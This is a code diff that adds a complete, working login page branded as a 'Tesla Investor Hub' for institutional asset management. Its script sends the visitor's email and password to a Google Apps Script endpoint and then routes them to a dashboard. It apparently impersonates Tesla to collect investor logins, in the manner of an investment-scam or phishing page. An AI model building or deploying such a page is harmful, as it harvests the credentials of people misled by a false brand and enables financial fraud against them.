@@ -1,1 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla Capital Portal - Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen px-4">
 
+    <div class="w-full max-w-md bg-[#141414] border border-[#222] rounded-2xl p-8 shadow-2xl">
+        <div class="flex flex-col items-center mb-8">
+            <svg class="w-12 h-12 text-[#E82127] fill-current" viewBox="0 0 24 24">
+                <path d="M12 2L2 4.5v2L12 9l10-2.5v-2L12 2zm0 8.5L3 8v6.5c0 3 4 5.5 9 6.5 5-1 9-3.5 9-6.5V8l-9 2.5z"/>
+            </svg>
+            <h1 class="text-white text-2xl font-semibold mt-4 tracking-tight">Tesla Investor Hub</h1>
+            <p class="text-[#888] text-sm mt-1">Institutional Growth & Asset Management</p>
+        </div>
+
+        <div id="alertBox" class="hidden mb-4 p-4 text-sm rounded-xl border bg-red-950/30 border-red-900 text-red-400"></div>
+
+        <form id="loginForm" class="space-y-5">
+            <div>
+                <label class="block text-xs font-medium uppercase tracking-wider text-[#aaa] mb-2">Secure Email Address</label>
+                <input type="email" id="email" required placeholder="name@example.com" 
+                    class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] transition-all text-sm">
+            </div>
+
+            <div>
+                <label class="block text-xs font-medium uppercase tracking-wider text-[#aaa] mb-2">Access PIN / Password</label>
+                <input type="password" id="password" required placeholder="••••••••" 
+                    class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] transition-all text-sm">
+            </div>
+
+            <button type="submit" id="submitBtn" 
+                class="w-full bg-[#E82127] hover:bg-[#c61a1f] active:scale-[0.99] text-white font-medium py-3.5 rounded-xl transition-all text-sm mt-2 shadow-lg shadow-red-900/20">
+                Verify Credentials
+            </button>
+        </form>
+    </div>
+
+    <script>
+        const API_URL = "https://script.google.com/macros/s/AKfycbx7Gg2ClxC7VdaDReZzI4jV_q8RKBDYPteFN526vQjmsxWSmGDQyy-NLkDXhivOHSh0Yw/exec";
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const alertBox = document.getElementById('alertBox');
+            const submitBtn = document.getElementById('submitBtn');
+            
+            alertBox.classList.add('hidden');
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Authenticating secure terminal...";
+
+            const payload = {
+                action: "login",
+                email: document.getElementById('email').value.trim(),
+                password: document.getElementById('password').value
+            };
+
+            try {
+                const response = await fetch(API_URL, {
+                    method: "POST",
+                    mode: "cors",
+                    headers: { "Content-Type": "text/plain" },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+
+                if (result.status === "success") {
+                    // Cache session keys inside the browser instance
+                    localStorage.setItem("userId", result.userId);
+                    localStorage.setItem("fullName", result.fullName);
+                    localStorage.setItem("sessionToken", result.token);
+                    
+                    // Route directly to dashboard
+                    window.location.href = "dashboard.html";
+                } else {
+                    throw new Error(result.message);
+                }
+            } catch (err) {
+                alertBox.innerText = err.message || "Network timeout connection error.";
+                alertBox.classList.remove('hidden');
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Verify Credentials";
+            }
+        });
+    </script>
+</body>
+</html>
